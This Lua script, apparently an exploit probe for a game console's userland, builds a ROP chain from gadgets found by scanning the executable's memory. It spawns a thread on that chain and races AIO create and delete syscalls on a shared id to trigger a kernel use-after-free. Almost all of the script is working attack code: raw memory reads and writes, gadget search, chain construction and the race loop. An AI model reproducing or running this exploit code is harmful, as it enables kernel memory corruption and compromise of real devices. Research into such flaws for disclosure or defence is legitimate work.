-- CRASH_CLASS: HIGH
-- PROBE 1043b: the aio create/delete race at native speed.
-- 1043a proved a child chain can drive syscalls from its own stack while the parent uses the
-- Lua pivot.  Here the child hammers 662 delete on the id the parent keeps rewriting in OUT,
-- while the parent loops 669 create -> 662 delete.  Both sides touch the same table entry.
-- If a delete frees a slot that a racing create already reused, the free block in the 48-byte
-- class lands on the new object (the shape the 14.20 gen-ID check was added to reject).
print("=== PROBE 1043b: aio create/delete race at native speed ===")
local ROUNDS = 20000
local PLUA = 30000
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return tonumber(v) or 0
end
local function mk(n) local t = {} for k, v in pairs(syscall.pipe) do t[k] = v end t.syscall_no = n setmetatable(t, getmetatable(syscall.pipe)) return t end
local function rd(a) local o, v = pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function zero(a, n) pcall(function() for i = 0, n - 4, 4 do memory.write_dword(a + i, 0) end end) end

local fn = to_num(syscall.pipe.fn_addr)
print(string.format("[0] fn=%08X pid=%d", fn, to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
local info = memory.alloc(0x200); wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info + 0x10C) or 0) * 4294967296 + (rd(info + 0x108) or 0)
local function find_pat(base, limit, pat)
    local off = 0
    while off < limit do
        local want = limit - off; if want > 0x1000 then want = 0x1000 end
        local ok, s = pcall(function() return memory.read_buffer(base + off, want) end)
        if not ok or type(s) ~= "string" then return nil end
        local i = string.find(s, pat, 1, true)
        if i then return base + off + i - 1 end
        off = off + want
    end
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58, 0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F, 0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E, 0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A, 0xC3))
local pop_rcx = find_pat(ebase, 0x494000, string.char(0x59, 0xC3))
local pop_r8  = find_pat(ebase, 0x494000, string.char(0x41, 0x58, 0xC3))
local store   = find_pat(ebase, 0x494000, string.char(0x48, 0x89, 0x07, 0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB, 0xFE))
print(string.format("[0] eboot=%08X rax=%s rdi=%s rsi=%s rdx=%s rcx=%s r8=%s",
    ebase, tostring(pop_rax), tostring(pop_rdi), tostring(pop_rsi), tostring(pop_rdx),
    tostring(pop_rcx), tostring(pop_r8)))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[!] gadget missing"); return end

local function mmap(px)
    local _, a = pcall(function() return mk(477)(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a); if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = { MAGIC = 0x108, TYPE = 0x110, CS = 0x0C0, RIP = 0x0E0, RSP = 0x0F8, SS = 0x100,
              RDI = 0x048, RSI = 0x050, RDX = 0x058, RAX = 0x078 }
local STACK = 0x100000
local block = mmap(STACK)
local D   = mmap(0x4000)   -- create descriptor block
local OUT = mmap(0x4000)   -- create writes the new id here
local ST  = mmap(0x4000)   -- status word
local RES = mmap(0x4000)   -- child completion marker
print(string.format("[A] block=%08X D=%08X OUT=%08X", block, D, OUT))
if block == 0 or D == 0 or OUT == 0 then print("[!] mmap failed"); return end

-- the child: ROUNDS x 662(OUT, 1, ST)   (ids pointer is OUT, so it deletes whatever id the parent last wrote)
local start = block + 0x4000
local function put(i, v) wq(start + 8 + i * 8, uint64(v)) end
local n = 0
for r = 1, ROUNDS do
    put(n, pop_rdi); put(n + 1, OUT); put(n + 2, pop_rsi); put(n + 3, 1)
    put(n + 4, pop_rdx); put(n + 5, ST); put(n + 6, pop_rax); put(n + 7, 662); put(n + 8, fn)
    n = n + 9
end
put(n, pop_rax); put(n + 1, 20); put(n + 2, fn)
put(n + 3, pop_rdi); put(n + 4, RES); put(n + 5, store)
put(n + 6, pop_rdi); put(n + 7, 0); put(n + 8, pop_rax); put(n + 9, 431); put(n + 10, fn); put(n + 11, jmp_g)
local n2 = n + 12
print(string.format("[B] chain words=%d bytes=%d head=%08X", n2, n2 * 8, start))

local ctx = memory.alloc(0x500); zero(ctx, 0x500)
wq(ctx + Ctx.MAGIC, uint64(0x480)); wq(ctx + Ctx.TYPE, uint64(0x10000))
wq(ctx + Ctx.CS, uint64(0x43)); wq(ctx + Ctx.SS, uint64(0x3B))
wq(ctx + Ctx.RIP, uint64(fn)); wq(ctx + Ctx.RSP, uint64(start + 8))
wq(ctx + Ctx.RAX, uint64(662))
wq(ctx + Ctx.RDI, uint64(OUT)); wq(ctx + Ctx.RSI, uint64(1)); wq(ctx + Ctx.RDX, uint64(ST))
local tb = memory.alloc(8); wq(tb, uint64(0))
local okc0, rv0 = pcall(function() return mk(669)(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(OUT)) end)
local id0 = rd(OUT) or 0
print(string.format("[P] seed create ok=%s rv=%s id=%d", tostring(okc0), tostring(to_num(rv0)), id0))
if id0 == 0 then print("[!] seed create failed"); return end
wd(OUT, 0)  -- hand the id to the child as the file's pointer, not a value
wq(OUT, uint64(id0))
local oksp, rvsp = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
print(string.format("[S] spawn ok=%s rv=%s", tostring(oksp), tostring(to_num(rvsp))))
if not oksp then print("[!] spawn failed"); return end

-- parent: create a fresh object for every delete, so the table keeps a live id at all times
local sc669, sc662 = mk(669), mk(662)
local rounds, crerr, del_nz, miss = 0, 0, 0, 0
local hist = {}
for i = 1, PLUA do
    rounds = rounds + 1
    wd(D + 0x00, 0); wd(D + 0x08, 0); wd(D + 0x10, 0); wd(D + 0x18, 0); wd(D + 0x20, -1); wd(D + 0x24, 0)
    wd(OUT, 0)
    local okc, rvc = pcall(function() return sc669(uint64(0x1001), uint64(D), uint64(1), uint64(1), uint64(OUT)) end)
    local id = rd(OUT) or 0
    if not okc or id == 0 then crerr = crerr + 1 else
        wd(ST, 0)
        local okd, rvd = pcall(function() return sc662(uint64(OUT), uint64(1), uint64(ST)) end)
        local sv = rd(ST) or 0
        if not okd then del_nz = del_nz + 1 elseif sv ~= 0 then
            del_nz = del_nz + 1
            local k = string.format("%08X", sv); hist[k] = (hist[k] or 0) + 1
        end
    end
    if i % 5000 == 0 then print(string.format("[C] i=%d crerr=%d del_nz=%d", i, crerr, del_nz)) end
end
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 100000000)
pcall(function() mk(240)(uint64(ts), uint64(0)) end)
print(string.format("[D] rounds=%d crerr=%d del_nz=%d res=%d", rounds, crerr, del_nz, rd(RES) or -1))
local ks = {}
for k, v in pairs(hist) do ks[#ks + 1] = k .. "=" .. v end
table.sort(ks)
print("[D] status " .. table.concat(ks, " "))
print("[Z] alive pid=" .. tostring(to_num(native.fcall_with_rax(syscall.pipe.fn_addr, 20))))
